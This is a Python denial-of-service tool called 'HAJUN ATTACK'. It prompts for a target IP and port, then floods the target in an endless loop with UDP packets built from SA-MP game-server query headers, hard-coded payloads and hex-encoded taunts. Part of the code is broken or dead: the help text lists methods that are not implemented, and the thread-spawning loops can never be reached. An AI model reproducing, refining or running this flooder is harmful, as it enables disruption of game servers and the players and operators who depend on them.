import socket
import struct
import codecs,sys
import threading
import random
import time
import os

def help():
  print("""
  HAJUN ATTACK
  Methods:
    SAMP-KILLER
    UDP-KILL
    TCP-KILL""")

def sampkil():
  ip = str(input("[•] IP Target: "))
  port = int(input("[•] Port Target: "))
  Ddos = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),
  codecs.decode("53414d509538e1a9611e63","hex_codec"),codecs.decode("53414d509538e1a9611e69","hex_codec"),#u
  codecs.decode("44444f532041545441434b202d3e2042592058414c4241444f52202d3e2053454e44","hex_codec"),#i
  codecs.decode("544845204a4159202d3e2041545441434b202d3e20534552564552","hex_codec"),#u
  codecs.decode("5448454a415920582058414c4241444f52202d3e2041545441434b202d3e204558504c4f4954202d3e20534552564552202d3e20554450","hex_codec"),#asu
  codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
  codecs.decode("081e62da","hex_codec"), #cookie port 7796
  codecs.decode("081e77da","hex_codec"),#cookie port 7777
  codecs.decode("081e4dda","hex_codec"),#cookie port 7771
  codecs.decode("021efd40","hex_codec"),#cookie port 7784
  codecs.decode("021efd40","hex_codec"),#cookie port 1111
  codecs.decode("35342c38302c3232","hex_codec"),#cookie port 7771 
  codecs.decode("081e7eda","hex_codec")]
  print(f"""
  ###############################
  #  Methods : SAMP-KILLER      #
  #  IP Samp : {ip}\t\t#
  #  Port    : {port}\t\t#
  ###############################""")
  while True:
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    msg = Ddos[random.randrange(0,5)]
    sent = Ddos[random.randrange(0,3)]
    down = Ddos[random.randrange(0,14)]
    sock.sendto(msg, (ip, int(port)))
    sock.sendto(sent, (ip, int(port)))
    sock.sendto(down, (ip, int(port)))
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    if(int(port) == 7777):
      sock.sendto(Ddos[5], (ip, int(port)))
      sock.sendto(Ddos[10], (ip, int(port)))
      sock.sendto(Ddos[6], (ip, int(port)))
      sock.sendto(Ddos[5], (ip, int(port)))
      s.sendto(Ddos[13], (ip, int(port)))
      s.sendto(Ddos[2], (ip, int(port)))
      s.sendto(Ddos[7], (ip, int(port)))
      sock.sendto(Ddos[7], (ip, int(port)))
      sock.sendto(Ddos[8], (ip, int(port)))
      sock.sendto(Ddos[3], (ip, int(port)))
      sock.sendto(Ddos[9], (ip, int(port)))
    elif(int(port) == int(port)):
      sock.sendto(Ddos[9], (ip, int(port)))
      sock.sendto(Ddos[6], (ip, int(port)))
      sock.sendto(Ddos[8], (ip, int(port)))
      sock.sendto(Ddos[10], (ip, int(port)))
      sock.sendto(Ddos[3], (ip, int(port)))
  for x in range(200):
    samp = threading.Thread(target=sampkil)
    samp.start()
    time.sleep(.1)
  for x in range(200):
    samp = threading.Thread(target=sampkil)
    samp.start()
    time.sleep(.1)


while True:
  masuk = input("-$ ")
  if masuk.upper() == "HELP":
    help()
  elif masuk.upper() == "SAMP-KILLER":
    sampkil()
  elif masuk.upper() == "EXIT":
    print("Byee")
    exit()
